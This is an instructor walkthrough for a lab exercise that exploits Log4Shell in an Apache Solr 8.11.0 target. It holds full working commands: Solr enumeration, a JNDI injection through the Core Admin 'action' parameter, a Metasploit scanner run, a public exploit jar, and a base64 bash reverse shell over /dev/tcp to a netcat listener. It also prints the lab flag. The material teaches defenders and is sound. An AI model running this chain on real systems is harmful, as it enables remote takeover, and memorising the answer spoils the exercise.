---
id: B02.M13-walkthrough
title: Phoenix — Instructor Walkthrough
artifact_type: activity_walkthrough
audience: instructor
block: B02
module_type: lab
legacy_aliases:
- legacy/week2/labs/pcte_vulnhub_targets/walkthroughs/03-target3-log4j2.md
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: instructor_only
references:
- path: ./answer-key.md
---

# Phoenix — Instructor Walkthrough

## Objective and starting context

Live instructor demo for the Phoenix Module (`B02.M13`). Students know only the assigned subnet `192.168.12.0/24`. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.12.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T3_FLAG`. Confirm the live `.env` value before grading.


## Required Tools
* `iproute2` (for adding static routes when your host has no path to the target subnet)
* `nmap` (for host discovery and port scanning)
* `curl` (for Solr admin enumeration and the `action=` JNDI trigger)
* `python3` (pretty-print Solr JSON)
* `java` (run the JNDI helper jar)
* `JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar` (public LDAP/RMI + HTTP class helper; obtain in section 4)
* `nc` (Netcat, for catching the reverse shell)
* `metasploit-framework` (section 4 — `log4shell_scanner` confirms Solr; it does not give a shell)

## 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.12.0/24`. We are positioned on the external lab network (`192.168.100.0/24`).

If your host does not already have a route into that Class C, add one via the lab router (address and path vary by deployment):

```bash
sudo ip route add 192.168.12.0/24 via 192.168.100.254
```

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```bash
nmap -sn 192.168.12.0/24
```

*Output excerpt:*
```text
Nmap scan report for 192.168.12.10
Host is up (0.000012s latency).
```

**Observation:** One live host responds on this subnet: **192.168.12.10**.

**Inference:** That address is the candidate to enumerate. We still know nothing about services or software.

## 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```bash
nmap -Pn -sV -p- 192.168.12.10
```

*Why these options:*

* `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.12.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
* `-sV` — version detection. An open port labeled only `http` is not enough; we need the product string (here, **Apache Solr**).
* `-p-` — all 65535 TCP ports, not nmap’s default top 1000. **8983** is Solr’s usual listen port and is easy to miss on a top-ports-only scan.

*Output excerpt:*
```text
PORT     STATE SERVICE VERSION
8983/tcp open  http    Apache Solr
```

**Observation:** A single open port — **8983/tcp** — identified as **Apache Solr**.

**Inference:** This is a search/admin HTTP service, not a generic web app on 80/8080. Next, confirm the admin UI responds and look for version / runtime details Solr itself exposes. Use **`:8983`** in every URL because that is the only listener nmap found.

### Initial Web Probing

nmap told us HTTP on **8983**. Confirm that with a normal GET — headers first. This is ordinary recon `curl`, not an exploit. You can also open `http://192.168.12.10:8983/solr/` in a browser; the admin UI is the same surface.

```bash
curl -s -D - -o /dev/null http://192.168.12.10:8983/solr/ | head -15
```

*Why this `curl`:*

* `-s` — silent; drop the progress meter.
* `-D -` — write response **headers** to stdout.
* `-o /dev/null` — throw away the HTML body for this first check; we only need status and Solr-style headers.
* `| head -15` — only the first header lines.

*Header excerpt:*
```text
HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Security-Policy: default-src 'none'; ...
X-Content-Type-Options: nosniff
```

**Observation:** `/solr/` returns HTTP 200 with Solr-style security headers and an HTML admin document.

**Inference:** Unauthenticated access to the Solr admin surface is available. Searching with the product name from nmap — `Apache Solr admin info system` — points at the System Info Handler at `/solr/admin/info/system` ([System Info Handler](https://solr.apache.org/guide/solr/latest/configuration-guide/system-info-handler.html)).

Fetch it and pretty-print. `wt=json` is Solr’s **writer type** — JSON instead of the XML default. The full JSON is just over ~100 lines; show the top, which holds the useful version fields:

```bash
curl -s "http://192.168.12.10:8983/solr/admin/info/system?wt=json" | python3 -m json.tool | head -n 40
```

*Head excerpt:*
```json
{
    "responseHeader": {
        "status": 0,
        "QTime": 7
    },
    "mode": "std",
    "solr_home": "/opt/solr/server/solr",
    "lucene": {
        "solr-spec-version": "8.11.0",
        "solr-impl-version": "8.11.0 e912fdd5b632267a9088507a2a6bcbc75108f381 - jpountz - 2021-11-09 14:08:51",
        "lucene-spec-version": "8.11.0",
        "lucene-impl-version": "8.11.0 e912fdd5b632267a9088507a2a6bcbc75108f381 - jpountz - 2021-11-09 14:03:35"
    },
    "jvm": {
        "version": "1.8.0_102 25.102-b14",
        "name": "Oracle Corporation OpenJDK 64-Bit Server VM",
        "jre": {
            "vendor": "Oracle Corporation",
            "version": "1.8.0_102"
        },
        ...
```

**Observation:** **Solr 8.11.0** (`lucene.solr-spec-version`) on **Java 1.8.0_102** (`jvm.jre.version`).

**Inference:** The JVM is below the **8u191** JNDI remote-classloading cutoff (`trustURLCodebase` still true). If a JNDI lookup can be triggered, LDAP/RMI remote class loading is plausible. We still need evidence of which logging library Solr uses.

Solr also exposes a logging API at `/solr/admin/info/logging` ([Configuring Logging](https://solr.apache.org/guide/solr/latest/deployment-guide/configuring-logging.html)). That response is large (~1900 pretty-printed lines). Pull the top of the document and grep for logger-related names:

```bash
curl -s "http://192.168.12.10:8983/solr/admin/info/logging?wt=json" | python3 -m json.tool | head -n 30
curl -s "http://192.168.12.10:8983/solr/admin/info/logging?wt=json" | python3 -m json.tool | grep -n -i 'log4j\|"watcher"'
```

*Why pretty-print then grep:*

* `python3 -m json.tool` — indent so keys sit on their own lines.
* `grep -n -i 'log4j\|"watcher"'` — case-insensitive (`-i`); `-n` prints line numbers. `log4j` is the library name we are hunting. `"watcher"` is Solr’s field for which logging implementation is hooked (`Log4j2` vs JUL, and so on). `|` is extended-regex **or**.

*Head excerpt:*
```json
{
    "responseHeader": {
        "status": 0,
        "QTime": 1
    },
    "watcher": "Log4j2",
    "levels": [
        "ALL",
        "TRACE",
        "DEBUG",
        "INFO",
        "WARN",
        "ERROR",
        "FATAL",
        "OFF"
    ],
    "loggers": [
        {
            "name": "root",
            "level": "INFO",
            "set": true
        },
        ...
```

*Grep excerpt:*
```text
6:    "watcher": "Log4j2",
804:            "name": "org.apache.solr.logging.log4j2",
809:            "name": "org.apache.solr.logging.log4j2.Log4j2Watcher",
```

**Observation:** Logging watcher is **`Log4j2`**, with Solr packages under `org.apache.solr.logging.log4j2`.

**Inference:** Log4j2 only resolves `${jndi:...}` when that string reaches a log call. We need a Solr admin handler that accepts attacker-controlled query parameters and logs them — often during error handling when the value is invalid.

We are already working under `/solr/admin/` (`info/system`, `info/logging`). Stay in that API family rather than guessing unrelated paths.

**Candidate selection:** Searching from **Solr 8.11.0** + **Log4j2** — `solr log4j2 jndi`, `CVE-2021-44228 solr`, or the matching Vulhub environment (`vulnhub/log4j/CVE-2021-44228/README.md`) — surfaces the [Core Admin API](https://solr.apache.org/guide/solr/latest/configuration-guide/core-admin.html) at `/solr/admin/cores` and **Log4Shell (CVE-2021-44228)** ([Log4j Security](https://logging.apache.org/log4j/2.x/security.html)). Public PoCs inject into the `action` query parameter (`STATUS`, `RELOAD`, and similar values are valid; invalid values are logged before Solr returns `400`). Confirm that handler responds before poisoning `action`.

Confirm the Core Admin handler responds:

```bash
curl -s "http://192.168.12.10:8983/solr/admin/cores?wt=json" | python3 -m json.tool | head -n 25
```

*Excerpt:*
```json
{
    "responseHeader": {
        "status": 0,
        "QTime": 1
    },
    "initFailures": {},
    "status": {
        "demo": {
            "name": "demo",
            ...
```

**Observation:** `/solr/admin/cores` returns HTTP 200 with core status for `demo`.

**Inference:** This endpoint accepts the `action` query parameter from the Core Admin docs. That matches the injection surface identified in the candidate search above — next, probe whether invalid `action` values are logged and processed by Log4j2.

At this point we have:

* **Solr 8.11.0** on **Java 1.8.0_102**
* Logging watcher **`Log4j2`**
* An unauthenticated admin parameter surface at `/solr/admin/cores?action=...`

Exact Log4j jar versions are not exposed by these endpoints. The matching Vulhub README also notes that this Solr build ships **Log4j 2.14.1**, inside the vulnerable 2.0–2.14.1 window. Prefer testing JNDI injection via the logged `action` parameter before chasing unrelated Solr issues.

## 3. Vulnerability Discovery

**What the bug is:** Log4j2 interpolates lookup strings inside log messages. `${jndi:ldap://host/path}` is one of those lookups. In vulnerable versions (**2.0 through 2.14.1**), Log4j performs a real **JNDI** lookup against that LDAP/RMI URL. On a JDK before **8u191**, the JVM will then download and run a remote Java class (`trustURLCodebase=true`). That is **Log4Shell / CVE-2021-44228**. Solr’s Core Admin `action` parameter is logged when the value is not a valid operation — so an invalid `action=${jndi:...}` is enough to hit Log4j.

That is the research result. Next we **prove** this host interpolates JNDI, using a public detection shape — not a reverse shell yet.

### Failed Attempt: DNS-Style Probe Without a Listener

Vulhub suggests a DNS-style probe such as:

```text
/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.example.com}
```

In an offline lab there is usually no useful DNS sink for that callback.

*What we learned:* Prefer an LDAP URL aimed at your own attacker IP so you can see Solr's resolved string in the error (and later complete the lookup with your own listener).

### Working Probe: JNDI LDAP URL Pointed at the Attacker

Use your student/attacker host address on the lab-facing LAN (example below uses `192.168.100.1`). Nothing needs to listen yet — we only want Solr’s error body.

```bash
curl -s -G "http://192.168.12.10:8983/solr/admin/cores" \
  --data-urlencode 'action=${jndi:ldap://192.168.100.1:1389/probe}' | python3 -m json.tool
```

*Why this `curl`:*

* `-G` — send `--data-*` as a **query string on GET** (Core Admin is a GET handler, not a POST body).
* `--data-urlencode` — URL-encode the `action` value so `${`, `}`, and `:` survive the request. A raw `?action=${jndi:...}` is eaten or split by the shell.

*Output excerpt:*
```json
{
    "responseHeader": {
        "status": 400,
        "QTime": 1
    },
    "error": {
        "msg": "Unsupported operation: ldap://192.168.100.1:1389/probe",
        "code": 400
    }
}
```

**Observation:** Solr rejects the value as an invalid action (`400`), but `error.msg` shows **`ldap://192.168.100.1:1389/probe`** — the `${jndi:...}` wrapper is gone.

**Inference:** Log4j already resolved the lookup expression. That confirms **CVE-2021-44228 (Log4Shell)** on this path. Lookup is not yet code execution: full RCE still needs an attacker-side JNDI server that returns a reference to a malicious class, which this JDK will load.

Section 4 starts with Metasploit’s scanner (same Solr URI family), then uses a public JNDI helper jar for the class-loading step. Section 5 is a simpler command through that same jar if a reverse shell will not stick.

## 4. Automated Path: Metasploit scanner, then JNDI helper

`search log4shell` / `search cve:2021-44228` finds two relevant modules. They are **not** the same job.

* `auxiliary/scanner/http/log4shell_scanner` — injects `${jndi:ldap://...}` into a built-in URI list that **includes Solr Core Admin**. It proves the LDAP callback. It does **not** give a shell.
* `exploit/multi/http/log4shell_header_injection` — injects JNDI strings into **HTTP headers**. This Solr sink is the **`action` query parameter**, so skip the header exploit here.

Run the scanner against the host we already enumerated:

```bash
msfconsole -q
```

```text
msf6 > use auxiliary/scanner/http/log4shell_scanner
msf6 auxiliary(scanner/http/log4shell_scanner) > set RHOSTS 192.168.12.10
msf6 auxiliary(scanner/http/log4shell_scanner) > set RPORT 8983
msf6 auxiliary(scanner/http/log4shell_scanner) > set SRVHOST 192.168.100.1
msf6 auxiliary(scanner/http/log4shell_scanner) > run
```

*Why these options:* `RHOSTS` / `RPORT` are Solr (`8983`). `SRVHOST` is your lab-facing IP — the scanner listens for the LDAP callback there (same role as `-A` on the JNDI jar later).

*Output excerpt:*
```text
[*] Started service listener on 192.168.100.1:389
[+] 192.168.12.10:8983 - Log4Shell found via /solr/admin/cores?action=CREATE&wt=json&name=${jndi:ldap://...} (java: ... 1.8.0_102)
```

That matches the Core Admin surface from section 2. For a shell, use a helper that serves LDAP **and** a remote class.

### Public JNDI helper jar

Vulhub's README recommends [Java Chains](https://github.com/vulhub/java-chains). That works, but it is a larger multi-component setup. Searching for a lightweight companion — `JNDI injection exploit jar LDAP` or the artifact name `JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar` — leads to [welk1n/JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit).

**Why this one:** single standalone jar, ships a GitHub release asset (no local Maven build), listens for LDAP/RMI and serves the class over HTTP, and matches this JDK (`trustURLCodebase` still true on 8u102). If the ops station has no GitHub access, stage that same v1.0 release jar first.

```bash
curl -fsSL -o JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
```

Inspect usage before running (`-C` is the command to execute after classload; `-A` is the attacker address advertised in LDAP/HTTP URLs). See the project's [README](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README.md).

**Important:** the jar passes `-C` to `Runtime.getRuntime().exec(...)`. Plain shell redirects and casually quoted `bash -c '…'` strings usually fail because `exec` tokenizes on spaces. Prefer a shell-escaped form that expands correctly under `exec`, such as bash brace-expansion + base64.

In one terminal, start a listener (replace with your lab-facing IP):

```bash
nc -lvnp 4444
```

Build a base64 payload of the reverse-shell line, then start the JNDI server with the brace-expansion form that survives `Runtime.exec`:

```bash
# decode later becomes: bash -i >& /dev/tcp/192.168.100.1/4444 0>&1
PAYLOAD=$(echo -n 'bash -i >& /dev/tcp/192.168.100.1/4444 0>&1' | base64 -w0)
echo "$PAYLOAD"

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C "bash -c {echo,$PAYLOAD}|{base64,-d}|{bash,-i}" \
  -A 192.168.100.1
```

*Output excerpt:*
```text
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
ldap://192.168.100.1:1389/jwow5x
...
[LDAPSERVER] >> Listening on 0.0.0.0:1389
```

The tool prints **multiple** LDAP URLs for different JDK profiles. Enumeration showed Java `1.8.0_102`, so copy the URL from the **JDK 1.8 / trustURLCodebase is true** section — not the first `ldap://` line.

High-level stages once that URL is injected into `action=`:

1. Solr logs the parameter; Log4j2 resolves `${jndi:ldap://...}`.
2. The target contacts the attacker LDAP listener and receives a reference to a remote Java class.
3. Because this JDK is below 8u191, it downloads and runs that class (`ExecTemplateJDK8.class` over HTTP).
4. The class runs the `-C` command via `Runtime.exec`.

In another terminal, inject that URL (`\$` keeps the shell from eating `${jndi:...}` inside double quotes):

```bash
LDAP_URL='ldap://192.168.100.1:1389/jwow5x'

curl -s -G "http://192.168.12.10:8983/solr/admin/cores" \
  --data-urlencode "action=\${jndi:$LDAP_URL}" | python3 -m json.tool
```

Confirm success from the **JNDI server log** (LDAP redirect + HTTP class download):

```text
[LDAPSERVER] >> Send LDAP reference result for jwow5x redirecting to http://192.168.100.1:8180/ExecTemplateJDK8.class
[JETTYSERVER]>> Log a request to http://192.168.100.1:8180/ExecTemplateJDK8.class
```

And from the **netcat** terminal:

```text
listening on [any] 4444 ...
connect to [192.168.100.1] from (UNKNOWN) [192.168.12.10] 53730
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@aaaaaaaaaaaa:/opt/solr/server#
```

From that shell:

```bash
cat /flag.txt
```

*Output:*
```text
amber-lynx
```

That is a complete automated path to the flag. Section 5 is the same JNDI helper with a one-argument command if the reverse shell never connects.

## 5. Manual Path: copy the flag without a reverse shell

If LDAP and class download succeed but **no** shell connects, the usual cause is `Runtime.exec` splitting `bash -c '…'`. Do not switch bugs. Restart the helper with a simple argv command that copies the flag into Solr’s static webapp directory:

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \
  -C 'cp /flag.txt /opt/solr/server/solr-webapp/webapp/flag.txt' \
  -A 192.168.100.1
```

Copy the **new** JDK 1.8 LDAP URL the jar prints (the path token changes each run). Trigger it the same way as section 4, then:

```bash
curl -s http://192.168.12.10:8983/solr/flag.txt
```

*Output:*
```text
amber-lynx
```

Use the fallback only when an interactive shell is impractical. For this target, a shell is realistic and should be the preferred path.

Target 3 is complete.
